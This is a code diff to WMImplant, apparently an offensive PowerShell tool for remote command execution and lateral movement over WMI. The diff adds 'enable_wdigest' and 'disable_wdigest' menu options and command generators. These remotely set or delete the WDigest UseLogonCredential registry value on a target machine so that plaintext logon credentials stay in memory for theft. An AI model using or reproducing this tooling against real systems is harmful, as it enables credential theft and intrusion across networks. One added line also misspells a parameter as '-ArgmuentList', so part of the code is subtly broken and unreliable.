@@ -660,15 +660,43 @@ function Invoke-CommandGeneration
         {
             $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                        $Command
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
-                        $Command
-                    }
+            {
+                $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
+                $Command
+            }
+        }
+
+        "disable_wdigest"
+        {
+            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget`n"
+                $Command
+            }
+        }
+
+        "enable_wdigest"
+        {
+            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget`n"
+                $Command
+            }
         }
 
         "registry_mod"
@@ -1509,12 +1537,26 @@ function Invoke-RegValueMod
 
                 if($Creds)
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target -Credential $Creds
+                    if($RegValue -eq "UseLogonCredential")
+                    {
+                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target -Credential $Creds
+                    }
+                    else
+                    {
+                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target -Credential $Creds
+                    }
                 }
 
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target
+                    if($RegValue -eq "UseLogonCredential")
+                    {
+                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target
+                    }
+                    else
+                    {
+                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target
+                    }
                 }
             }
 
@@ -2876,6 +2918,8 @@ function Show-WMImplantMainMenu
     $menu_options += "Lateral Movement Facilitation`n"
     $menu_options += "====================================================================`n"
     $menu_options += "command_exec - Run a command line command and get the output`n"
+    $menu_options += "disable_wdigest - Remove registry key UseLogonCredential`n"
+    $menu_options += "enable_wdigest - Add registry key UseLogonCredential`n"
     $menu_options += "registry_mod - Modify the registry on the targeted system`n"
     $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
     $menu_options += "sched_job - Manipulate scheduled jobs`n"
@@ -3041,6 +3085,32 @@ function Use-MenuSelection
                 else
                 {
                     Invoke-CommandExecution
+                }
+            }
+
+            "disable_wdigest"
+            {
+                if ($Credential)
+                {
+                    Invoke-RegValueMod -Creds $Credential -RegMethod delete -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue 'UseLogonCredential'
+                }
+
+                else
+                {
+                    Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue 'UseLogonCredential'
+                }
+            }
+
+            "enable_wdigest"
+            {
+                if ($Credential)
+                {
+                    Invoke-RegValueMod -Creds $Credential -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '0x1'
+                }
+
+                else
+                {
+                    Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -RegValue UseLogonCredential -RegData "0x1"
                 }
             }
 
